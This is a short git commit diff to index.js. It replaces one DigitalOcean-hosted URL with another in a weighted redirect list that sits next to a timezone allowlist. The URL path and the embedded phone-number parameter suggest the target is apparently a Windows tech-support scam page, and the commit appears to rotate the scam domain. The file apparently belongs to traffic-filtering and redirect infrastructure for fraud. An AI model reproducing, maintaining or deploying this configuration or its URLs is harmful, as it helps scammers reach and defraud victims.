c22b3eb53f02fc0f7f2811b8073e7860552bcd42
paalakash <palaksh452@gmail.com>
2026-06-18 10:28:31 +0530

    Fix URL in RAW_CONFIGS array

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-i3wa6.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3883", weight: 1.0 }
+    { url: "https://oyster-app-wvmj9.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3883", weight: 1.0 }
 
 ];
 
